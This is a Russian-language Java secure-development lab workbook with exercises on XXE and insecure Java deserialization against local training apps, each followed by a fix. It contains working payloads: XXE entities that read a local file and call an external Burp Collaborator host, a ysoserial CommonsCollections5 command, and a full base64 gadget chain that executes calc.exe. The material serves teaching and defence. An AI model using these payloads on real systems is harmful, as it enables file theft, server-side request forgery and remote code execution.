# Лабораторный практикум "Безопасная разработка ПО: Прикладной курс Java"

## Содержание
1. [Настройка окружения](#environment)
2. [Обработка XML](#xxe)
3. [Сериализация и десерилизация данных](#)

## <a name="environment"></a>Настройка окружения
### Настройка Burp Suite и Firefox
1. Установить Firefox (<https://www.mozilla.org/ru/firefox/>)
2. Скачать Burp Suite Community Edition JAR file
(<https://portswigger.net/burp/communitydownload>)
3. Запустить Burp Suite
 (<https://support.portswigger.net/customer/portal/articles/1783038-Installing_Launching%20Burp.html>)
4. Сконфигурировать Firefox для работы с Burp
(<https://support.portswigger.net/customer/portal/articles/1783055-Installing_Configuring%20your%20Browser.html>)
5. Уберите _localhost_ и _127.0.0.1_ из списка адресов, на которые браузер
заходит без прокси

### Настройка IntelliJ IDEA
1. Скачать и установить IntelliJ IDEA Community Edition
(https://www.jetbrains.com/idea/download/)
2. Открыть в IntelliJ IDEA папку с проектом training_java_security_deep_dive

## <a name="xxe"></a>Задание №1. Обработка XML
### Описание
Одной из наиболее распространенных атак на приложения, обрабатывающие XML,
является внедрение внешних XML сущностей (XML eXternal Entity - XXE).
Эта атака возникает при обработке плохо сконфигурированными парсерами
XML-документов, содержащих ссылки на внешние сущности.
### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-01-xxe_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Посмотрите пример счёта (bill_example.xml). _Какую структуру счёта ожидает
приложение?_
4. Загрузите счёт в приложение через форму (http://localhost:8091/bill).
_Как происходит обработка счёта?_
5. Запустите Unit-тесты. Проанализируйте результаты их выполнения.

#### Часть 2. Внедрение внешних сущностей XML
1. _Что такое DTD (Document Type Defenition)?
Как можно определить DTD внутри XML-документа?_
2. Определите XML-сущность в документе счёта. Загрузите сформированный
счёт в приложение. _Что произошло?_
```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe "XXE Vulnerability Test"> ]>
<bill>
    <product id="28">
        <name>&xxe;</name>
        <quantity>1</quantity>
        <price>1337</price>
    </product>
</bill>
```
3. _Что такое внещние XML-сущности (eXternal XML Entities)?_
4. Создайте файл C:\\TEMP\\secret.txt. Определите внешнюю XML-сущность в
документе так, чтобы можно было прочитать этот файл. Загрузите сформированный
счёт в приложение. _Что произошло?_
```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE product [ <!ELEMENT product ANY >
    <!ENTITY xxe SYSTEM "file:////C:\\TEMP\\secret.txt"> ]>
<bill>
    <product id="28">
      <name>&xxe;</name>
      <quantity>77</quantity>
      <price>31337</price>
    </product>
</bill>
```
5. _Какие возможности это открывает перед атакующим?_

#### Часть 3. Предотвращение уязвимостей XXE
1. Откройте _BillPrintingController_. Найдите участок кода, отвечающий за
обработку счетов. _Как происходит обработка XML в приложении?_
2. Отключите поддержку DTD (и, соответсвенно, поддержку внешних сущностей).
```Java
DocumentBuilderFactory dbfactory = DocumentBuilderFactory.newInstance();
dbfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
3. Загрузите в приложение счёт с XXE. _Что произошло?_
4. Запустите Unit-тесты. Проанализируйте результаты их выполнения. Проверьте,
что счета без внешних сущностей обрабатываются корректно.

### Дополнительные задания
#### Часть 4. Расширенная эксплуатация XXE
1. Верните поддержку DTD в приложении.
2. Определите внешнюю сущность так, чтобы можно было обратиться к внутреннему
серверу.  _Что произошло?_
```XML
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE product [ <!ELEMENT product ANY >
    <!ENTITY xxe SYSTEM "http://gyiv38a8htdpb0m9zfr7w95tkkqaez.burpcollaborator.net"> ]>
<bill>
    <product id="28">
      <name>&xxe;</name>
      <quantity>77</quantity>
      <price>31337</price>
    </product>
</bill>
```
3. _Какие возможности это открывает перед атакующим?_

## <a name="deserialization"></a>Задание №2. Сериализация и десерилизация данных
### Описание

__Избегайте десериализации данных, полученных из недоверенных источников.__

Если такой подход невозможен, следующие меры позволят снизить риск:

* Обеспечьте строго ограничение типа во время десериализации до создания
объекта (см. Java Jackson);
* Внедрите проверку целостности (с использованием закрытого ключа) или шифрование сериализованных объектов для предотвращения атак, связанных с созданием
подложным объектов или изменением данных;
* Изолируйте код, выполняющий десериализацию, и запускайте его в окружении с
минимальными привилегиями;
* Выполняйте логирование и мониторинг всех исключений и ошибок, связанных с
десериализацией.

### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-02-deserialization_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Перейдите по ссылке _[set your name](http://localhost:8091/hello?name=test)_.
И установите себе имя.
4. Перейдите по ссылке _look at yourself_. _Что передается в
параметрах?_

#### Часть 2. Небезопасное использование нативной Java десериализации
1. Посмотрите код HelloController. _В каком формате генерируется параметр
session?_
2. Скопируйте значение параметра __session__ во вкладку __Decoder__. Настройте
декодирование (Decode as __URL__ -> Decode as __Base64__).
3. Скопируйте декодированное значение в первое окно ввода. Настройте кодирование
(Encode as __Base64__ -> Encode as __URL__).
4. Измените имя с _test_ на _vuln_. Скопируйте закодированное значение и
добавьте в URL вместо оригинального параметра. _Что произошло?_
5. Скачайте генератор payload'ов для эксплуатации небезопасной Java Native
десериализации [ysoserial](https://github.com/frohoff/ysoserial/releases).
__ПРЕДУПРЕЖДЕНИЕ: Возможно срабатывание антивирусных средств на данный payload__
6. Сгенерируйте payload для запуска калькулятора через гаджет CommonCollections5
```
java -jar ysoserial-master.jar CommonsCollections5 calc.exe > payload.bin
```
7. Вставьте сгенерированный payload в Burp Suite (Вкладка Repeater -> ПКМ ->
  Paste From File)
8. Закодируйте payload (Выделите всё -> ПКМ -> Send to Decoder ->
  Encode as __Base64__)
9. Отправьте в Repeater запрос к ois (Вкладка Proxy -> выбрать соответсвующий
  запрос -> ПКМ -> Send to Repeater)
10. Замените значение параметра session на закодированный payload. Примените к
вставленному значению URL encode (ПКМ -> Convert selections -> URL ->
  URL-encode key characters)
  ```
  rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAU3QAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAANXEAfgANcQB%2bAA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB%2bAAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB%2bAAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2bADJzcQB%2bACt1cQB%2bAC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB%2bADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AMgAAAAFxAH4AN3NxAH4AJ3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eA%3d%3d
  ```
11. Отправьте запрос, посмотрите логи приложения. _Что произошло?_

#### Часть 3. Безопасное использование JSON десериализации
1. Для JSON-сериализации воспользуемся библиотекой Jackson:
```Java
import com.fasterxml.jackson.databind.ObjectMapper;
```
2. Измените тип сериализации параметра session на JSON (метод hello):
```Java
ObjectMapper mapper = new ObjectMapper();
byte[] jsonBytes = mapper.writeValueAsBytes(webUser);
String webUserOISB64 = Base64.getEncoder().encodeToString(jsonBytes);
```
3. Изменим тип десериализации параметра session (метод ois).
```Java
byte[] byteSession = Base64.getDecoder().decode(session);
ObjectMapper mapper = new ObjectMapper();
User webUser = mapper.readValue(byteSession, User.class);
```
4. Проверьте работоспособность приложения
